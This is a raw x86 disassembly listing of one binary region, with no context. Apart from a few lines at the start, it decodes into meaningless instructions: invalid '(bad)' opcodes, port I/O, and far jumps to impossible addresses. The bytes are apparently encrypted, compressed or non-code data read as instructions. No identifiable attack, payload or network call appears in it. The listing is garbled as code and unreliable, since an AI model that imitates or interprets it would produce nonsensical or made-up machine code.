  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x73e91af2
  41883e:	fwait
  41883f:	in     al,0x17
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	stos   BYTE PTR es:[edi],al
  418849:	push   esp
  41884a:	xor    eax,0x7a687bdb
  41884f:	outs   dx,DWORD PTR ds:[esi]
  418850:	and    BYTE PTR [edx-0x3d06d1ef],ch
  418856:	jecxz  0x418854
  418858:	bnd jno 0x41883a
  41885b:	imul   esi,DWORD PTR [ebx],0xd220dba8
  418861:	ss jnp 0x4188aa
  418864:	mov    esp,0x12c130ac
  418869:	and    DWORD PTR [edi],edi
  41886b:	fsubr  DWORD PTR [esi]
  41886d:	inc    ecx
  41886e:	inc    esi
  41886f:	mov    cl,0x12
  418871:	jge    0x41888d
  418873:	in     eax,0x3b
  418875:	mov    WORD PTR [edx-0x2d],ss
  418878:	cmp    bl,0x77
  41887b:	jmp    0xbcfb7747
  418880:	lds    ebx,FWORD PTR [eax]
  418882:	and    al,0x5
  418884:	es mov cl,0xb3
  418887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418888:	mov    ds:0x87d0c46b,al
  41888d:	dec    esi
  41888e:	xlat   BYTE PTR ds:[ebx]
  41888f:	pushf  
  418890:	scas   al,BYTE PTR es:[edi]
  418891:	(bad)  
  418892:	popf   
  418893:	push   0xb
  418895:	mov    al,0xfb
  418897:	xor    bl,dl
  418899:	cwde   
  41889a:	pop    esi
  41889b:	mov    bl,0x2b
  41889d:	lahf   
  41889e:	mov    al,BYTE PTR [esi-0x19cf7cb9]
  4188a4:	dec    ecx
  4188a5:	test   BYTE PTR [eax+0x64309d80],dl
  4188ab:	je     0x418864
  4188ad:	xchg   edx,edi
  4188af:	mov    WORD PTR [edx-0x54540841],ds
  4188b5:	inc    esp
  4188b6:	fcomp  QWORD PTR [ebx]
  4188b8:	mov    DWORD PTR [edx+0xf],esp
  4188bb:	les    ecx,FWORD PTR [ebp-0x54]
  4188be:	pop    esp
  4188bf:	inc    DWORD PTR [ebp+0x49]
  4188c2:	mov    edi,0xe1202061
  4188c7:	xor    eax,0x6f8a0326
  4188cc:	jo     0x4188a5
  4188ce:	arpl   si,sp
  4188d0:	cmp    al,0xb5
  4188d2:	gs repz icebp 
  4188d5:	push   es
  4188d6:	into   
  4188d7:	loope  0x418892
  4188d9:	add    esi,0xffffff89
  4188dc:	add    bh,BYTE PTR [esi-0x5]
  4188df:	out    dx,eax
  4188e0:	or     bh,BYTE PTR [esp+edi*2]
  4188e3:	mov    WORD PTR [ecx+0x8],fs
  4188e6:	mov    edx,0xf92e27b3
  4188eb:	xlat   BYTE PTR ds:[ebx]
  4188ec:	(bad)  
  4188ed:	xor    esi,ebx
  4188ef:	mov    ebp,0x9adc0ca0
  4188f4:	loope  0x41888f
  4188f6:	cs add al,0xb7
  4188f9:	ret    0xd1f5
  4188fc:	stc    
  4188fd:	pop    es
  4188fe:	repz or al,0x97
  418901:	dec    edi
  418902:	dec    edi
  418903:	in     al,0x10
  418905:	inc    esp
  418906:	and    al,0x7a
  418908:	mov    ecx,DWORD PTR [esi-0x3d2c0606]
  41890e:	and    BYTE PTR [esi-0x1d],ah
  418911:	out    0x50,al
  418913:	ficomp WORD PTR [esi+0x6a]
  418916:	(bad)  
  418917:	fadd   QWORD PTR [eax]
  418919:	mov    al,ds:0xa7380b91
  41891e:	ja     0x4188d5
  418920:	mov    bl,0x43
  418922:	in     eax,0xfe
  418924:	jge    0x41893d
  418926:	ja     0x41892b
  418928:	jnp    0x41897b
  41892a:	adc    dl,BYTE PTR [ebx+0x1738c924]
  418930:	add    cl,BYTE PTR [ecx-0x58]
  418933:	es aaa 
  418935:	inc    edi
  418936:	xchg   BYTE PTR [ecx],bh
  418938:	enter  0xd26f,0x57
  41893c:	mov    edx,0x694df66f
  418941:	mov    WORD PTR [ebx-0x14],fs
  418944:	xchg   dh,bl
  418946:	loopne 0x4188de
  418948:	xchg   ebp,eax
  418949:	(bad)  
  41894a:	jmp    0x54f0a47b
  41894f:	fwait
  418950:	je     0x418913
  418952:	ds repz mov ecx,0x61500b10
  418959:	ret    
  41895a:	gs test al,0x11
  41895d:	or     BYTE PTR [ebx-0x59],dh
  418960:	inc    edi
  418961:	popa   
  418962:	sbb    bl,dh
  418964:	imul   DWORD PTR [ebp+0x28]
  418967:	dec    ebp
  418968:	aad    0xdb
  41896a:	xor    al,0x4f
  41896c:	pop    es
  41896d:	loopne 0x418919
  41896f:	sbb    eax,0x394cb1c8
  418974:	test   eax,0xb19b2f4
  418979:	aaa    
  41897a:	adc    eax,0x3eaf5029
  41897f:	or     dl,dh
  418981:	sbb    BYTE PTR [eax],dl
  418983:	xchg   edi,eax
  418984:	imul   esi,ecx,0x2a
  418987:	add    eax,0xc462a255
  41898c:	mov    ds:0x8069e653,eax
  418991:	stos   DWORD PTR es:[edi],eax
  418992:	cmp    edx,edx
  418994:	test   eax,0x23d7015b
  418999:	enter  0x300d,0x9b
  41899d:	push   ebp
  41899e:	jno    0x418a0e
  4189a0:	push   ebx
  4189a1:	test   DWORD PTR [ebx+0x29],eax
  4189a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189a5:	mov    edi,0xf3bbfde5
  4189aa:	sahf   
  4189ab:	mov    ebp,0x9012e945
  4189b0:	mov    edi,DWORD PTR [edx+0x2c]
  4189b3:	mov    ds:0x1f7852e3,al
  4189b8:	loope  0x418a13
  4189ba:	sbb    al,0xf2
  4189bc:	or     eax,0x57a4d9ec
  4189c1:	push   esi
  4189c2:	in     eax,dx
  4189c3:	xor    dh,bl
  4189c5:	mov    dh,0xb3
  4189c7:	mov    esi,0x7a032e9c
  4189cc:	cmp    al,0xb0
  4189ce:	outs   dx,BYTE PTR ds:[esi]
  4189cf:	dec    edx
  4189d0:	popa   
  4189d1:	jne    0x418a4d
  4189d3:	sbb    ebx,DWORD PTR [edx-0x6821f42f]
  4189d9:	outs   dx,BYTE PTR ds:[esi]
  4189da:	(bad)  
  4189db:	xor    ebx,edx
  4189dd:	icebp  
  4189de:	out    dx,al
  4189df:	cld    
  4189e0:	hlt    
  4189e1:	out    dx,eax
  4189e2:	mov    edx,0xb93c55df
  4189e7:	test   DWORD PTR [ebp+0x7a9cd313],edx
  4189ed:	jecxz  0x4189f9
  4189ef:	mov    al,ds:0x7ff9796c
  4189f4:	jle    0x4189a1
  4189f6:	jne    0x418983
  4189f8:	aaa    
  4189f9:	aaa    
  4189fa:	cmp    eax,DWORD PTR [esi]
  4189fc:	(bad)  
  4189fe:	inc    ecx
  4189ff:	inc    eax
  418a00:	push   cs
  418a01:	stos   DWORD PTR es:[edi],eax
  418a02:	xor    ah,BYTE PTR [esi+0x24]
  418a05:	add    ebp,DWORD PTR ds:0x4deeef2e
  418a0b:	mov    ah,0x1f
  418a0d:	sub    al,0x23
  418a0f:	mov    ds:0x4ffc0e9,al
  418a14:	mov    WORD PTR [eax*4+0x69df0d9],?
  418a1b:	xchg   esp,eax
  418a1c:	adc    DWORD PTR ds:0xd7f6025f,esi
  418a22:	cmc    
  418a23:	sbb    BYTE PTR [edi-0x4c],bh
  418a26:	retf   0xd95c
  418a29:	inc    esp
  418a2a:	cdq    
  418a2b:	gs inc esp
  418a2d:	mov    al,0xfc
  418a2f:	clc    
  418a30:	inc    BYTE PTR [edi]
  418a32:	fidivr DWORD PTR [edi]
  418a34:	sbb    al,0xe
  418a36:	cmp    ch,ch
  418a38:	push   ss
  418a39:	mov    eax,ds:0x87537841
  418a3e:	add    cl,BYTE PTR [esi+0x51]
  418a41:	shl    DWORD PTR [eax-0x8e99842],cl
  418a47:	jecxz  0x418a61
  418a49:	jmp    0x418aa8
  418a4b:	aad    0x54
  418a4d:	mov    cl,0xb0
  418a4f:	nop
  418a50:	mov    eax,ds:0x33723aa1
  418a55:	mov    WORD PTR [ecx],es
  418a57:	addr16 cli 
  418a59:	fsubr  QWORD PTR [esi-0x648da607]
  418a5f:	test   DWORD PTR [ecx+edi*1],ebp
  418a62:	(bad)  
  418a63:	mov    bl,0xd7
  418a65:	mov    ch,0x24
  418a67:	inc    edx
  418a68:	and    dh,0x31
  418a6b:	int3   
  418a6c:	pop    ecx
  418a6d:	push   cs
  418a6e:	xchg   ebp,eax
  418a6f:	add    al,0x91
  418a71:	xchg   DWORD PTR [ebp+0x3a6c8bda],ebx
  418a77:	cmp    BYTE PTR [ecx],al
  418a79:	mov    bl,0x27
  418a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a7c:	rcl    BYTE PTR [esi],1
  418a7e:	fstp   DWORD PTR [eax]
  418a80:	add    edi,esp
  418a82:	cmp    BYTE PTR [esi-0x4c48b6c],bh
  418a88:	pusha  
  418a89:	mov    esp,0x6db2b2ca
  418a8e:	mov    ecx,0xd8c45317
  418a93:	inc    edx
  418a94:	push   edx
  418a95:	outs   dx,DWORD PTR ds:[esi]
  418a96:	add    dl,BYTE PTR [eax+0x5]
  418a99:	fcomi  st,st(7)
  418a9b:	daa    
  418a9c:	loopne 0x418adf
  418a9e:	push   es
  418a9f:	xchg   ecx,eax
  418aa0:	xchg   ecx,eax
  418aa1:	adc    al,0xeb
  418aa3:	rol    edx,cl
  418aa5:	fidivr DWORD PTR ds:0x286342c8
  418aab:	fsub   QWORD PTR [eax+0x51]
  418aae:	cmp    bl,BYTE PTR [ebp+edi*8+0x564d05b5]
  418ab5:	jle    0xccc31771
  418abb:	arpl   cx,bp
  418abd:	iret   
  418abe:	je     0x418ae2
  418ac0:	jmp    0xc729:0x157dd51b
  418ac7:	inc    ebx
  418ac8:	cmp    dh,ch
  418aca:	mov    edi,0xd3d0d8a0
  418acf:	shl    DWORD PTR [ebx-0x71],cl
  418ad2:	stos   DWORD PTR es:[edi],eax
  418ad3:	retf   
  418ad4:	scas   al,BYTE PTR es:[edi]
  418ad5:	fldcw  WORD PTR [ecx]
  418ad7:	arpl   sp,si
  418ad9:	jmp    0xd0390da9
  418ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418adf:	loop   0x418b27
  418ae1:	lahf   
  418ae2:	jbe    0x418a73
  418ae4:	jge    0x418a6a
  418ae6:	add    al,0x4b
  418ae8:	sbb    DWORD PTR [edi+ecx*1],eax
  418aeb:	fcomp  QWORD PTR [eax]
  418aed:	xor    DWORD PTR [eax],esp
  418aef:	shr    BYTE PTR [esi],0xd6
  418af2:	shl    BYTE PTR [eax+0x49d42205],1
  418af8:	mov    bh,BYTE PTR [esi+0x4709151e]
  418afe:	imul   ecx,DWORD PTR [ecx-0x2d],0x6084e03d
  418b05:	or     BYTE PTR [edi],ah
  418b07:	sti    
  418b08:	xchg   edi,eax
  418b09:	outs   dx,DWORD PTR ds:[esi]
  418b0a:	dec    edi
  418b0b:	(bad)  
  418b0c:	inc    eax
  418b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b0e:	adc    cl,BYTE PTR fs:[edx+edx*1+0x6d]
  418b13:	(bad)  
  418b14:	fld    TBYTE PTR [eax-0x556de34f]
  418b1a:	mov    ch,0xe4
  418b1c:	in     eax,0x2d
  418b1e:	mov    dh,BYTE PTR [ecx]
  418b20:	push   cs
  418b21:	and    dl,cl
  418b23:	xor    eax,0x927259fe
  418b28:	iret   
  418b29:	jmp    0x743f:0xd5c09a83
  418b30:	test   eax,0x2c76871b
  418b35:	retf   0x7683
  418b38:	push   ss
  418b39:	inc    edi
  418b3a:	mul    al
  418b3c:	(bad)  
  418b3e:	xor    al,0xbf
  418b40:	in     eax,0x8e
  418b42:	inc    edx
  418b43:	hlt    
  418b44:	das    
  418b45:	push   DWORD PTR ds:0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	fild   WORD PTR [esi+0x66]
  418b65:	inc    edx
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	pop    ebx
  418b6f:	jne    0x418b6b
  418b71:	sbb    DWORD PTR [ebx-0x3b],edi
  418b74:	sbb    al,0x40
  418b76:	dec    ebx
  418b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b78:	sub    BYTE PTR [esi-0x4a],al
  418b7b:	inc    ecx
  418b7c:	out    0xe6,eax
  418b7e:	into   
  418b7f:	xchg   ecx,eax
  418b80:	inc    esp
  418b81:	bound  ecx,QWORD PTR [edx-0x79b6e927]
  418b87:	mov    al,0xfb
  418b89:	cld    
  418b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b8b:	loope  0x418b83
  418b8d:	das    
  418b8e:	mov    ebx,0x93e1636
  418b93:	test   eax,0x2335299
  418b98:	jno    0x418b8a
  418b9a:	sbb    edx,DWORD PTR [edi-0xb4bf066]
  418ba0:	das    
  418ba1:	mov    ecx,DWORD PTR [esi-0x80]
  418ba4:	and    BYTE PTR [edx+eax*2],al
  418ba7:	call   0x6506:0xa7f6fecb
  418bae:	jmp    0x418b93
  418bb0:	je     0x418c23
  418bb2:	mov    al,0x59
  418bb4:	jp     0x418b4e
  418bb6:	add    ah,BYTE PTR [eax-0x11]
  418bb9:	adc    eax,DWORD PTR [ecx+0x57dfe0a7]
  418bbf:	(bad)  [edx-0x6]
  418bc2:	fcom   QWORD PTR [ebx+ebp*4-0x39]
  418bc6:	jne    0x418ba1
  418bc8:	add    eax,0x67b38ecb
  418bcd:	inc    esi
  418bce:	dec    edi
  418bcf:	mov    ecx,0x62459d78
  418bd4:	mov    eax,0xfb3076a0
  418bd9:	mov    esp,0xbe6baad4
  418bde:	test   al,0x9d
  418be0:	mov    ah,0xce
  418be2:	hlt    
  418be3:	cmp    ch,BYTE PTR [eax+0x53]
  418be6:	sbb    ebx,DWORD PTR [esi+0x6d]
  418be9:	xchg   DWORD PTR [eax],edx
  418beb:	arpl   WORD PTR [edx-0x6c],bp
  418bee:	push   es
  418bef:	or     BYTE PTR [ebx+0x589638e0],0x77
  418bf6:	lods   eax,DWORD PTR ds:[esi]
  418bf7:	(bad)  
  418bf8:	lahf   
  418bf9:	cmp    DWORD PTR [esp+ecx*2],edx
  418bfc:	fwait
  418bfd:	fwait
  418bfe:	xor    BYTE PTR [edx-0x3b0cde51],ah
  418c04:	inc    ebx
  418c05:	adc    edx,ecx
  418c07:	je     0x418b94
  418c09:	out    0xa7,eax
  418c0b:	repz jg 0x418c20
  418c0e:	or     ah,BYTE PTR [ecx+0x51ae31e0]
  418c14:	dec    eax
  418c15:	daa    
  418c16:	outs   dx,DWORD PTR ds:[esi]
  418c17:	into   
  418c18:	push   edi
  418c19:	ret    
  418c1a:	inc    ebp
  418c1b:	sub    bh,BYTE PTR [ecx-0x2897e556]
  418c21:	sub    edx,ebp
  418c23:	mov    eax,ds:0x88ae4f5c
  418c28:	neg    cl
  418c2a:	icebp  
  418c2b:	mov    eax,0xf883584e
  418c30:	call   0xeaf8:0x551cea65
  418c37:	scas   al,BYTE PTR es:[edi]
  418c38:	repz lahf 
  418c3a:	and    ecx,edi
  418c3c:	ins    DWORD PTR es:[edi],dx
  418c3d:	sub    esi,ecx
  418c3f:	fisttp QWORD PTR [edi]
  418c41:	sub    DWORD PTR [esi],0xa363df2a
  418c47:	mov    ds:0x66a6d0bc,eax
  418c4c:	cmp    edx,DWORD PTR [ebp-0x4b]
  418c4f:	adc    al,0xe9
  418c51:	dec    esi
  418c52:	rcr    BYTE PTR [edx-0x77461a47],cl
  418c58:	pusha  
  418c59:	mov    eax,ds:0xbaa08f86
  418c5e:	add    eax,DWORD PTR [esi]
  418c60:	add    bl,dh
  418c62:	jmp    edi
  418c64:	mov    al,ds:0x76d8f9fc
  418c69:	in     eax,dx
  418c6a:	xchg   esi,eax
  418c6b:	out    0x32,al
  418c6d:	add    eax,0x4df3c1f9
  418c72:	sub    DWORD PTR [edx],ebp
  418c74:	out    0x84,eax
  418c76:	pop    edi
  418c77:	ret    
  418c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c79:	xlat   BYTE PTR ds:[ebx]
  418c7a:	push   edx
  418c7b:	push   0x2e0e1870
  418c80:	dec    edx
  418c81:	add    ah,al
  418c83:	aam    0x39
  418c85:	call   0x9503c107
  418c8a:	cli    
  418c8b:	inc    ebx
  418c8c:	jae    0x418d04
  418c8e:	mov    edx,0x7dd67b6b
  418c93:	adc    edi,DWORD PTR [edx+0x2f]
  418c96:	mov    bl,BYTE PTR ds:0x77330455
  418c9c:	sbb    al,0x9f
  418c9e:	call   0x3901:0xc84e082b
  418ca5:	(bad)  
  418ca6:	cld    
  418ca7:	add    BYTE PTR gs:[eax-0x756b30f4],dh
  418cae:	push   esp
  418caf:	dec    esi
  418cb0:	je     0x418d19
  418cb2:	xor    ebx,esp
  418cb4:	pop    ebp
  418cb5:	cmp    BYTE PTR [ebx+0xa],0xc5
  418cb9:	jmp    0xb291:0xda850f65
  418cc0:	retf   
  418cc1:	xor    BYTE PTR [ecx],ch
  418cc3:	aaa    
  418cc4:	adc    eax,0x3a7b31a2
  418cc9:	mov    ebp,0xcd135c15
  418cce:	mov    ebx,0x7f26cc64
  418cd3:	push   ebp
  418cd4:	mov    bl,0xe8
  418cd6:	push   cs
  418cd7:	out    0xf8,eax
  418cd9:	outs   dx,BYTE PTR ds:[esi]
  418cda:	xchg   edx,eax
  418cdb:	and    eax,0x4dd7e8ba
  418ce0:	add    dh,BYTE PTR [edx+0x22ca9481]
  418ce6:	mov    edx,0xbbfd3190
  418ceb:	push   edx
  418cec:	gs jb  0x418ca6
  418cef:	mov    cl,0x98
  418cf1:	adc    bh,bl
  418cf3:	cmc    
  418cf4:	ds xor eax,0x7b3cf6a4
  418cfa:	mov    cs,WORD PTR [edi]
  418cfc:	adc    al,0x42
  418cfe:	mov    eax,ds:0xaef0696d
  418d03:	mov    esp,DWORD PTR [edi+0x40]
  418d06:	mov    ebx,0xd055bca3
  418d0b:	dec    ebp
  418d0c:	fwait
  418d0d:	adc    esi,DWORD PTR [ebp-0x6d038f38]
  418d13:	jo     0x418cda
  418d15:	adc    DWORD PTR [ebx+eax*1-0x1d],esp
  418d19:	ss dec ebp
  418d1b:	test   DWORD PTR fs:[ecx-0x2],esi
  418d1f:	lds    eax,FWORD PTR [edx+0x27dec311]
  418d25:	mov    eax,0x365f6fc1
  418d2a:	and    edx,DWORD PTR [edx-0x178ba8e5]
  418d30:	mov    edi,0x4ccbaf09
  418d35:	xlat   BYTE PTR ds:[ebx]
  418d36:	popa   
  418d37:	sub    al,0x3e
  418d39:	nop
  418d3a:	inc    ebp
  418d3b:	pop    ss
  418d3c:	adc    DWORD PTR [ebx-0x6e],esp
  418d3f:	out    0xa5,eax
  418d41:	arpl   dx,ax
  418d43:	push   es
  418d44:	rcr    ch,cl
  418d46:	in     al,dx
  418d47:	in     eax,dx
  418d48:	mov    ds:0xd103b0fd,al
  418d4d:	push   0xe3fe50fa
  418d52:	pop    esi
  418d53:	aaa    
  418d54:	and    bl,BYTE PTR ds:0xf584e0c8
  418d5a:	fmul   DWORD PTR [esi+0x5b]
  418d5d:	push   ebp
  418d5e:	or     ebx,DWORD PTR [ebx]
  418d60:	jo     0x418d8e
  418d62:	or     BYTE PTR [ebp+0x480424eb],bh
  418d68:	addr16 inc edi
  418d6a:	push   cs
  418d6b:	xchg   ebp,eax
  418d6c:	lahf   
  418d6d:	fst    QWORD PTR [eax+edi*1-0x2]
  418d71:	jbe    0x418d0d
  418d73:	pop    ebp
  418d74:	push   0x354bc2d5
  418d79:	cmp    BYTE PTR [ebp+ebp*1+0x79c8567d],al
  418d80:	sbb    DWORD PTR [ebx+0x2b],edi
  418d83:	push   0xfffffffe
  418d85:	and    eax,0xae36fae9
  418d8a:	push   esi
  418d8b:	add    al,0x3c
  418d8d:	retf   0x1f31
  418d90:	jle    0x418d37
  418d92:	or     al,0xc3
  418d94:	mov    edx,0x898e29c6
  418d99:	mov    bh,0x69
  418d9c:	add    ebp,DWORD PTR [eax-0x48939045]
  418da2:	or     DWORD PTR [eax-0x3fb27bd],esi
  418da8:	lock sbb al,0xe3
  418dab:	mov    DWORD PTR [edx+eiz*8+0x5b],edx
  418daf:	dec    eax
  418db0:	jecxz  0x418e07
  418db2:	add    al,0x65
  418db4:	add    eax,DWORD PTR [esi]
  418db6:	cmp    DWORD PTR [ebp-0x5147392f],0x62
  418dbd:	shl    DWORD PTR [edx],0xfa
  418dc0:	or     ebx,DWORD PTR [edx+0x2764b916]
  418dc6:	popf   
  418dc7:	pushf  
  418dc8:	mov    BYTE PTR [eax],ch
  418dca:	leave  
  418dcb:	(bad)  [edx-0x564c3481]
  418dd1:	int3   
  418dd2:	lods   al,BYTE PTR ds:[esi]
  418dd3:	sub    al,0x9b
  418dd5:	imul   edi,DWORD PTR [ecx+edx*8-0x7fe4d105],0x74
  418ddd:	adc    BYTE PTR [edi+0x58],cl
  418de0:	adc    BYTE PTR [ebx-0x72],dh
  418de3:	pop    ss
  418de4:	sbb    eax,0xfec543c4
  418de9:	dec    ebp
  418dea:	retf   0x6315
  418ded:	sub    bh,BYTE PTR [edi]
  418def:	ins    BYTE PTR es:[edi],dx
  418df0:	mov    bh,0x75
  418df2:	xlat   BYTE PTR ds:[ebx]
  418df3:	scas   eax,DWORD PTR es:[edi]
  418df4:	mov    esi,0x80c91da4
  418df9:	daa    
  418dfa:	ret    0x972
  418dfd:	retf   0xa8bb
  418e00:	outs   dx,DWORD PTR ds:[esi]
  418e01:	int    0xb7
  418e03:	cmp    edi,DWORD PTR [eax+ecx*2]
  418e06:	push   es
  418e07:	mov    dh,0xb2
  418e09:	jg     0x418dd3
  418e0b:	(bad)  
  418e0d:	ins    DWORD PTR es:[edi],dx
  418e0e:	push   es
  418e0f:	cmp    DWORD PTR [esi+0x44],edx
  418e12:	sahf   
  418e13:	cdq    
  418e14:	jmp    0x4dc2:0x1e65288b
  418e1b:	and    ecx,esi
  418e1d:	sbb    al,0x72
  418e1f:	mov    dh,0xc0
  418e21:	(bad)  
  418e22:	adc    edx,DWORD PTR [edi]
  418e24:	ret    0xd08
  418e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e28:	sbb    BYTE PTR [ecx+0x31],dl
  418e2b:	enter  0x9a22,0xaf
  418e2f:	and    ecx,DWORD PTR [esi+eax*4-0x42b1f182]
  418e36:	daa    
  418e37:	push   ebp
  418e38:	mov    bh,0x69
  418e3a:	out    dx,al
  418e3b:	retf   0x7528
  418e3e:	jno    0x418dca
  418e40:	fstp   TBYTE PTR [esi+0x4089ed16]
  418e46:	xchg   edi,eax
  418e47:	xchg   DWORD PTR [ecx],ebx
  418e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e4a:	cmp    edi,DWORD PTR [ebx]
  418e4c:	je     0x418e64
  418e4e:	mov    ch,0x2d
  418e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e51:	and    DWORD PTR [ebx-0x393a3a9f],eax
  418e57:	xor    ebx,DWORD PTR [edx+0xa]
  418e5a:	mov    bh,0x54
  418e5c:	ret    0xd74e
  418e5f:	mov    eax,ds:0x573ad3b7
  418e64:	es xor al,0x62
  418e67:	jmp    0x8b30:0xff098cbe
  418e6e:	inc    ebp
  418e6f:	adc    cl,ch
  418e71:	adc    eax,0xcb000003
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	sar    dl,cl
  418e83:	into   
  418e84:	hlt    
  418e85:	or     eax,0x7b787fc0
  418e8a:	jle    0x418f04
  418e8c:	js     0x418e99
  418e8e:	les    ecx,FWORD PTR [ebx]
  418e90:	xor    eax,0xd7a622bf
  418e95:	cmc    
  418e96:	xchg   ebp,eax
  418e97:	and    al,BYTE PTR ds:[ecx+edi*1-0xd]
  418e9c:	test   al,0xfd
  418e9e:	in     al,dx
  418e9f:	sahf   
  418ea0:	(bad)  
  418ea1:	and    eax,0x8a2a4706
  418ea6:	pop    esp
  418ea7:	in     al,0x9b
  418ea9:	dec    ebp
  418eaa:	(bad)  
  418eab:	rcl    BYTE PTR [ebx+0x491f5f0c],1
  418eb1:	enter  0x5f39,0xe2
  418eb5:	lods   eax,DWORD PTR ds:[esi]
  418eb6:	mov    ebx,0xf3118616
  418ebb:	rcr    BYTE PTR [ecx+0x32],cl
  418ebe:	sbb    DWORD PTR [edx-0xd0b8d56],esi
  418ec4:	ins    BYTE PTR es:[edi],dx
  418ec5:	js     0x418f03
  418ec7:	cmp    al,0xb5
  418ec9:	sbb    DWORD PTR [ecx-0x51],edx
  418ecc:	sbb    al,0xfa
  418ece:	mov    eax,0xd34cfbc3
  418ed3:	ret    
  418ed4:	lods   al,BYTE PTR ds:[esi]
  418ed5:	int    0x2
  418ed7:	xor    esi,DWORD PTR [edi]
  418ed9:	js     0x418efd
  418edb:	adc    ch,BYTE PTR [ecx+0x10]
  418ede:	jge    0x418f2e
  418ee0:	into   
  418ee1:	xchg   ebx,eax
  418ee2:	popa   
  418ee3:	and    eax,0xa7eed392
  418ee8:	push   ss
  418ee9:	fistp  DWORD PTR [edi]
  418eeb:	xchg   DWORD PTR [esi],ebp
  418eed:	outs   dx,BYTE PTR ds:[si]
  418eef:	cmp    al,0x40
  418ef1:	mov    al,ds:0xbba8c468
  418ef6:	pop    ecx
  418ef7:	jmp    0x3c5:0x41f603f0
  418efe:	inc    eax
  418eff:	adc    al,BYTE PTR [edi]
  418f01:	retf   
  418f02:	xor    esp,esp
  418f04:	sbb    BYTE PTR [edx+edi*1+0x6bc0010e],ch
  418f0b:	mov    al,ds:0xa5e859e0
  418f10:	push   ebx
  418f11:	mov    ebp,0x8fa0471
  418f16:	cmp    al,0xcc
  418f18:	mov    ds:0xb7a69e25,al
  418f1d:	retf   0x5907
  418f20:	(bad)  
  418f21:	loop   0x418ee1
  418f23:	adc    ch,BYTE PTR [ebp+0x1b]
  418f26:	push   edi
  418f27:	in     eax,0x74
  418f29:	ss sub al,0x3a
  418f2c:	jge    0x418f60
  418f2e:	push   cs
  418f2f:	cs pop ebx
  418f31:	push   0x6bb40b8e
  418f36:	xor    BYTE PTR [edx],al
  418f38:	mov    ds:0x5273629d,eax
  418f3d:	fldenv [ecx+0x3e]
  418f40:	test   bh,dh
  418f42:	sub    ebp,DWORD PTR [eax+0x5cc5df9a]
  418f48:	aas    
  418f49:	arpl   bx,cx
  418f4b:	cs mov edi,0xafca0ba
  418f51:	aad    0x87
  418f53:	cdq    
  418f54:	jge    0x418f84
  418f56:	add    DWORD PTR [edi-0x44],ebx
  418f59:	rcl    DWORD PTR ds:0xf5f4368d,1
  418f5f:	mov    ecx,0x998710e7
  418f64:	xchg   ebx,eax
  418f65:	adc    al,0x7e
  418f67:	mov    ah,0x0
  418f69:	imul   DWORD PTR [edx-0x75]
  418f6c:	int3   
  418f6d:	jb     0x418f3e
  418f6f:	mov    dh,0x2
  418f71:	ret    0x1ef8
  418f74:	pusha  
  418f75:	xchg   BYTE PTR [esi+0x5b73d826],cl
  418f7b:	daa    
  418f7c:	fst    DWORD PTR [esi]
  418f7e:	lods   al,BYTE PTR ds:[esi]
  418f7f:	retf   0xc75b
  418f82:	jp     0x418f7e
  418f84:	rcl    BYTE PTR [edi+0x1eb80266],0xc9
  418f8b:	xchg   cl,ch
  418f8d:	mov    BYTE PTR [eax],0xd3
  418f90:	and    BYTE PTR [edx],0xcd
  418f93:	mov    ?,WORD PTR [ecx+eax*8-0x22]
  418f97:	mov    ebx,0xb39cfe95
  418f9c:	jl     0x418f52
  418f9e:	xor    al,0x46
  418fa0:	mov    eax,ds:0xee03207
  418fa5:	fwait
  418fa6:	(bad)  
  418fa7:	fnstsw WORD PTR [eax]
  418fa9:	sub    al,BYTE PTR [eax]
  418fab:	sbb    eax,0xdf43b3c9
  418fb0:	daa    
  418fb1:	adc    eax,0xeed06747
  418fb6:	outs   dx,DWORD PTR ds:[esi]
  418fb7:	(bad)  
  418fb8:	stos   DWORD PTR es:[edi],eax
  418fb9:	mov    ds:0x1d4dccc4,al
  418fbe:	leave  
  418fbf:	cmp    DWORD PTR [eax+0x53ddfa0c],ebx
  418fc5:	mov    ecx,ebx
  418fc7:	into   
  418fc8:	cmp    al,dl
  418fca:	push   0x9f66f250
  418fcf:	mov    eax,0x4caf72c0
  418fd4:	pop    edi
  418fd5:	ins    BYTE PTR es:[edi],dx
  418fd6:	daa    
  418fd7:	fisub  WORD PTR fs:[esi]
  418fda:	and    DWORD PTR [ebp-0x75],0xffffff8e
  418fde:	jno    0x418fc1
  418fe0:	sub    ah,BYTE PTR [ecx-0x6833d4c3]
  418fe6:	test   DWORD PTR [ebx-0x3f],esp
  418fe9:	repnz int 0x60
  418fec:	xchg   edi,eax
  418fed:	into   
  418fee:	add    eax,0xbdd2468a
  418ff3:	scas   al,BYTE PTR es:[edi]
  418ff4:	inc    esp
  418ff5:	shl    DWORD PTR [ecx+0x74],1
